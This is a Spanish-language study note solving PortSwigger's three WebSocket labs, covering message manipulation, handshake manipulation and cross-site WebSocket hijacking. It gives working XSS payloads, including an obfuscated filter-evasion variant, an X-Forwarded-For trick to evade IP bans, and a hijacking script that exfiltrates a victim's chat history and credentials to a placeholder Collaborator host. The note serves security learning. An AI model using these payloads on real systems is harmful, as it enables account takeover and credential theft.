---
aliases:
  - WebSocket labs
  - websocket-labs
  - CSWSH
tags:
  - vuln/websocket
  - labs
  - portswigger
---

# WebSocket attacks — Labs de PortSwigger

Labs de la categoría **[WebSockets](https://portswigger.net/web-security/websockets)**: **1 Apprentice + 2 Practitioner** (3 en total). **El hilo común:** un **WebSocket** es solo un canal **persistente y bidireccional** sobre el que viajan datos de la app — y es **tan atacable como HTTP normal**. Las **vulns clásicas viajan dentro de los mensajes** (XSS, SQLi…), el **handshake** es un request manipulable (headers, IP), y como el handshake **no lleva CSRF token**, se puede **secuestrar desde otro sitio** (CSWSH). Lo que cambia lab a lab: **qué parte tocás** (mensaje → handshake → conexión entera) y **qué defensa** esquivás.

> [!note] Tres "sabores" de WebSocket attack
> - **Manipular el mensaje:** interceptás el mensaje WS en Burp y le inyectás lo que la sanitización **client-side** dejó pasar → XSS al otro extremo (el agente de soporte). Lab 1.
> - **Manipular el handshake:** editás los **headers del handshake** (`X-Forwarded-For` para spoofear IP) + payload ofuscado para saltar **filtro XSS + baneo de IP**. Lab 2.
> - **Cross-Site WebSocket Hijacking (CSWSH):** el handshake **no tiene CSRF token** y la sesión va en cookie → tu página abre un WS a la víctima **en su contexto**, lee su historial y lo **exfiltra**. Es "CSRF que además lee la respuesta". Lab 3.

> **Herramienta central:** Burp — **Proxy → WebSockets history** (ver/interceptar mensajes) y **Repeater** (edita mensajes, **reconecta** editando el handshake). Para CSWSH: **exploit server** + **Collaborator**. **Cómo leer las columnas:** **Qué se manipula** = qué parte del WS tocás · **Técnica · qué necesitás** = cómo + herramientas · **Objetivo** = qué conseguís. Payloads → [Solución por lab](#solución-por-lab).

## Apprentice

| #   | Laboratorio                                                                                                                                    | Qué se manipula                                                        | Técnica · qué necesitás                                                                                                                                                             | Objetivo                                                                     |
| --- | -------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------- |
| 1   | [Manipulating WebSocket messages to exploit vulnerabilities](https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities) | **El mensaje WS:** el cliente encodea `<` pero eso se saltea por Burp. | **Interceptar y editar el mensaje:** el chat sanitiza en el navegador, pero interceptás el mensaje WS en **Burp Proxy** (antes de que salga) e inyectás el XSS crudo. Solo Burp.  | Que el XSS ejecute en el navegador del **agente de soporte** → `alert(1)`.   |

## Practitioner

| #   | Laboratorio                                                                                                                                       | Qué se manipula                                                                 | Técnica · qué necesitás                                                                                                                                                                                                    | Objetivo                                                                                 |
| --- | --------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------- |
| 2   | [Manipulating the WebSocket handshake to exploit vulnerabilities](https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities) | **El handshake + el mensaje:** filtro XSS agresivo que **banea tu IP**.        | **Spoof de IP + payload ofuscado:** en el handshake agregás `X-Forwarded-For: 1.1.1.1` para **saltar el baneo**, y mandás un payload con event handler en **mixed-case** para **evadir el filtro**. Burp Repeater (reconnect). | XSS en el navegador del **agente** esquivando filtro + ban → `alert()`.                  |
| 3   | [Cross-site WebSocket hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)                              | **La conexión entera:** el handshake **no tiene CSRF token** y usa cookie.       | **CSWSH:** desde el **exploit server** servís JS que abre un WS al `/chat` de la víctima, manda `READY` para pedir el historial y **exfiltra** cada mensaje a **Collaborator**. La víctima visita → cae su historial.        | Robar el **historial de chat** de la víctima (trae user+pass) → **loguearte como ella**. |

---

## Solución por lab

> Los mensajes WS se ven/editan en **Proxy → WebSockets history** y en **Repeater** (pestaña WebSocket: editás el mensaje y **Send**; para tocar el handshake, **Reconnect**).

**L1 — Manipular el mensaje (XSS por WS):**
1. Mandá un mensaje cualquiera en el chat; en **Proxy → WebSockets history** vas a ver el mensaje saliente.
2. Con **intercept** activo (o desde Repeater), editá el texto del mensaje a:
   ```html
   <img src=1 onerror='alert(1)'>
   ```
3. Forwardealo → el server lo reenvía al **agente de soporte**, cuyo navegador ejecuta el `onerror` → `alert(1)`.
> La sanitización del chat es **solo en el cliente**; al inyectar por Burp te la salteás.

**L2 — Manipular el handshake (IP spoof + filtro):**
1. Probá un XSS normal → el filtro lo bloquea y **te banea la IP** (los siguientes mensajes fallan).
2. En **Repeater**, **Reconnect** y editá el **handshake** agregando:
   ```
   X-Forwarded-For: 1.1.1.1
   ```
   (nueva IP → se levanta el ban).
3. Mandá el payload **ofuscado** (event handler mixed-case + call con backticks):
   ```html
   <img src=1 oNeRrOr=alert`1`>
   ```
4. → `alert()` en el navegador del agente.
> Cada intento fallido re-banea; cambiá el `X-Forwarded-For` cuando lo necesites.

**L3 — Cross-Site WebSocket Hijacking (CSWSH):**
1. Confirmá que el handshake de `/chat` **no lleva CSRF token** y que la sesión va en **cookie** (se manda sola cross-site).
2. En el **exploit server** serví esta página (reemplazá `WSS-URL` y `COLLAB`):
   ```html
   <script>
   const ws = new WebSocket('wss://LAB-ID.web-security-academy.net/chat');
   ws.onopen = () => ws.send('READY');                 // pide el historial
   ws.onmessage = (e) => fetch('https://COLLAB/?' + encodeURIComponent(e.data));  // exfil
   </script>
   ```
3. Probalo contra **tu** chat (mirá las interacciones en **Collaborator**), después **Deliver to victim**.
4. En Collaborator llega el historial de la víctima → **contiene su usuario y contraseña** → logueate como ella.
> Es el mismo PoC que ya tenés en `vulnerabilities/012-websockets/websocket.md`.

---

## Atajos mentales / patrones

- **Un WS es HTTP con otro traje:** dentro de los mensajes viajan datos de la app → probá **las mismas vulns** (XSS, SQLi, command injection) que probarías en un parámetro HTTP. Burp los trata casi igual (history + Repeater).
- **La sanitización client-side no vale:** si el chat encodea en el navegador, **interceptá el mensaje en Burp** y mandá el payload crudo (L1).
- **El handshake es un request manipulable:** headers (`X-Forwarded-For`, `Origin`, `Cookie`), y podés **reconectar** editándolo en Repeater. Útil para **IP spoofing** / saltar bans (L2).
- **Ofuscá para filtros:** event handlers en **mixed-case** (`oNeRrOr`), call con **backticks** (`alert\`1\``), variantes de `<img>/<svg>` → ver [[vulnerabilities/019-obfuscacion/xss-obfuscation|xss-obfuscation]].
- **CSWSH = CSRF + lectura:** si el handshake **no valida `Origin` ni lleva CSRF token** y la sesión va en cookie, cualquier sitio puede abrir el WS **como la víctima** y **leer** lo que responde (a diferencia del CSRF clásico, que es ciego). Defensa: CSRF token en el handshake + validar `Origin`.
- **Objetivos típicos:** L1/L2 → **XSS al agente** (`alert`); L3 → **exfiltrar datos** de la víctima (historial con credenciales) → toma de cuenta.

> [!note] Ver también
> - **XSS** (lo que inyectás dentro del mensaje) → [[vulnerabilities/002-xss/README|xss]] · ofuscación → [[vulnerabilities/019-obfuscacion/xss-obfuscation|xss-obfuscation]].
> - **CSRF** (CSWSH es su primo que además lee la respuesta) → [[vulnerabilities/003-csrf/csrf|csrf]].
> - **PoC de CSWSH** listo para editar → `vulnerabilities/012-websockets/websocket.md`.
